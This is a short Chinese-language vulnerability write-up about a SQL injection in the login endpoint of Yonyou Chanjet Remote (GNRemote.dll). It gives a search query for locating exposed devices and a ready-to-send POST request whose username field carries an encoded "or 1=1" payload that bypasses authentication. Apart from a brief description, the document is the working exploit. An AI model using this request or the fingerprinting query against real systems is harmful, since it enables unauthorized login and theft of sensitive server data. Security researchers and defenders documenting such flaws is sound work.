# 用友 畅捷通远程通 GNRemote.dll SQL注入漏洞

## 漏洞描述

用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备

## 漏洞影响

```
用友 畅捷通远程通
```

## 网络测绘

```
body="远程通CHANJET_Remote"
```

## 漏洞复现

登录页面

![image-20221017171544062](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115849500.png)

验证POC

```
POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl

username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
```

![image-20221017171557552](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115849502.png)

![image-20221017171609942](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115849503.png)